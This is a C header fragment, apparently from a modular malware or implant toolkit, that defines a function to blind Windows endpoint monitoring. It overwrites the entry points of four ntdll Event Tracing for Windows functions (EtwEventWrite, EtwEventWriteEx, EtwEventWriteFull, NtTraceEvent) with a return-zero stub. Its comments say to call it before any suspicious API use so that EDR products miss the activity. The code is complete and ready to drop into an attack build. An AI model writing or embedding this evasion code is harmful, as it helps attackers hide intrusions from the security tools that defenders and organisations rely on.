// chunk: evasion/etw_full_patch
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: medium
// note: Patches EtwpEventWriteFull (internal EDR codepath), NtTraceEvent (syscall entry), and EtwEventWrite (user-mode entry). Covers all three ETW write paths — user-mode, internal, and kernel boundary. Call before any suspicious API usage.

#ifndef CHUNK_ETW_FULL_PATCH
#define CHUNK_ETW_FULL_PATCH

static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // xor eax, eax; ret — returns STATUS_SUCCESS (0)
    BYTE patch[] = {0x33, 0xC0, 0xC3};
    int patched = 0;

    const char *targets[] = {
        "EtwEventWriteFull",   // Internal function EDRs hook for rich telemetry
        "NtTraceEvent",        // Syscall-level entry point for ETW events
        "EtwEventWrite",       // Standard user-mode ETW write path
        "EtwEventWriteEx",     // Extended write variant some providers use
    };

    for (int i = 0; i < 4; i++) {
        BYTE *addr = (BYTE *)GetProcAddress(ntdll, targets[i]);
        if (!addr) continue;

        DWORD old;
        if (!VirtualProtect(addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
            continue;

        for (unsigned j = 0; j < sizeof(patch); j++)
            addr[j] = patch[j];

        VirtualProtect(addr, sizeof(patch), old, &old);
        patched++;
    }

    return patched > 0 ? 1 : 0;
}

#endif
